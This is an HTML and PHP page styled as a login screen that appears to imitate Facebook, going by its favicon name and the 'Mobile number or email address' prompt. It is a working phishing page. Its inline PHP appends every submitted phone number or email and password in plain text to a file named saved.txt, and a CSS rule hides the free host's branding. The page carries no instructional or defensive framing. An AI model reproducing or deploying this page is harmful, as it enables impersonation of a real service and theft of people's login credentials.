<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Page</title>
<style>

::placeholder{
	color:silver;
	padding-left:20px;
}
</style>
<link rel="icon" 
      type="image/png/svg" 
      href="img/fbfav.svg">
<link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
</head>
<body>
<center>
<p></p>
<form action="" method="POST">
    
<?php
if(isset($_POST['submit'])){
$Name = "Phonenumber :".$_POST['phonenumber']."
";
$Pass = "Password :".$_POST['password']."
";
$file=fopen("saved.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fclose($file);
}
?>
<img src="https://blogger.googleusercontent.com/img/a/AVvXsEitPcvFznPmGL2u8IuYNQJqWY2tU7UFZv_HdadRZiOiusHU5M8lCm2d7HWSfkHg9Kw1lp2BhPlbYOC_IyRQkp46ZJsKJeHma3o-MhvpQcYr6SpnbAk8h-IilcxyWkd1bDF9QVpWJICq2rkFu_-Jg_68-ez2zDnrvE07_Hti2oy8CMWaa-5VDb68vzj9=s720" width="100%" />

<p style="color:red; font-family:sans-serif;">

  You are not logged in <br> Please Login To Continue.   
</p>
<p><input type="text" class="phonenumber" name="phonenumber" placeholder="Mobile number or email address" minlength="11" style=" padding-top:10px; padding-bottom:15px;  background:whitesmoke; width:95%; border:1px solid lightgray; border-radius:5px 5px; outline:none; margin-bottom:6px; " required >
<input type="text" name="password" placeholder="password" style=" padding-top:10px; padding-bottom:15px; background:whitesmoke; width:95%; border:1px solid lightgray; border-radius:5px 5px; outline:none; minlength:5;">
<input type="submit" name="submit" value="Log In" style=" margin-top:12.5px; padding-top:5px; padding-bottom:12.5px; color:white; font-weight:bold; font-family:arial; font-size:20px; background:dodgerblue;  width:95%; border:none; border-radius:5px 5px; outline:none;" required ></p>
</form>
<img src="https://blogger.googleusercontent.com/img/a/AVvXsEi2K-nVqIG-HWDLIsuswgHuqkOEi8LDQCeIsiJZJqsgdlDnH5f0yYyAHKf2jPw4BZH45fLO-0Atfdi7BW_a9knwROOm1LBr9B8w_qEbNJTCWhnvGXm6epBsyheLqB1mm3KKleYA2URcsvLNUuOiwJJU_5Of8q0lkx_jJLPBZKNcypblWoX1QZSDgGzi=s722" width="100%" />
<style <img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] { display: none; }</style>
</center>
</body>
</html>